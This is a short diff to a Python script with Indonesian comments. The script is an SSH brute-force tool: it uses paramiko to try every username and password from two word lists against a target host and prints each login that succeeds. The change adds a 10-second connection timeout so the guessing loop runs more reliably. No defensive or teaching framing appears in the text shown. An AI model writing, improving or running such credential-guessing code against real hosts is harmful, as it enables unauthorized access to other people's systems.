@@ -29,10 +29,10 @@ with open(file_password, "r") as file:
 for username in daftar_username:
     for password in daftar_password:
         try:
-            # Buat koneksi SSH
+            # Buat koneksi SSH dengan timeout default 10 detik
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            client.connect(alamat_host, port_ssh, username, password)
+            client.connect(alamat_host, port_ssh, username, password, timeout=10)
 
             # Jika berhasil login, tampilkan pesan sukses
             print(f"Login berhasil - Host: {alamat_host}, Username: {username}, Password: {password}")
